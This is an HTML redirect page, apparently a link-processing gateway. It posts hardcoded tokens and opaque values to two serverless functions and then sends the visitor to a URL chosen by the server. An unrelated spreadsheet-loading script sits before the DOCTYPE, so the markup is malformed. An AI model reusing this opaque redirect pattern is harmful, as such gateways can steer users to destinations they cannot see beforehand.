<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><!DOCTYPE html>
<html lang="en">

</head>
<body>
    <div class="container">
        <h1>Your link is being processed!</h1>
        <p id="countdown">Redirecting in 5 seconds...</p>
        <div class="loader"></div>
        <p id="status"></p>
    </div>

    <script>
        window.onload = async () => {
            const countdownElement = document.getElementById('countdown');
            const status = document.getElementById('status');
            let timeLeft = 5;

            const timer = setInterval(() => {
                timeLeft--;
                countdownElement.textContent = `Redirecting in ${timeLeft} seconds...`;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                }
            }, 1000);

            try {
                // First POST request to fv.php
                status.textContent = 'Submitting first request...';
                const fvResponse = await fetch('/.netlify/functions/submit-fv', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ value: '1' })
                });

                if (!fvResponse.ok) {
                    throw new Error('Failed to submit to fv.php');
                }

                const fvData = await fvResponse.json();
                if (!fvData.success) {
                    throw new Error('First request failed');
                }

                // Second POST request to fc.php
                status.textContent = 'Submitting second request...';
                const fcResponse = await fetch('/.netlify/functions/submit-fc', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        csrf_token: '57804304b926fb031ae11c35bf395c88110fbc08f75bcd3d3a18ac41b1a3234b',
                        var1: '971',
                        var2: 'https://www.google.com',
                        var3: 'fdfeefcbfefcfcaab',
                        var4: '1750870023',
                        con: 'US'
                    })
                });

                if (!fcResponse.ok) {
                    throw new Error('Failed to submit to fc.php');
                }

                const fcData = await fcResponse.json();
                status.textContent = 'Success! Redirecting...';
                setTimeout(() => {
                    window.location.href = fcData.redirect || 'https://www.google.com';
                }, 1000);
            } catch (error) {
                status.textContent = `Error: ${error.message}`;
                countdownElement.style.display = 'none';
                document.querySelector('.loader').style.display = 'none';
            }
        };
    </script>
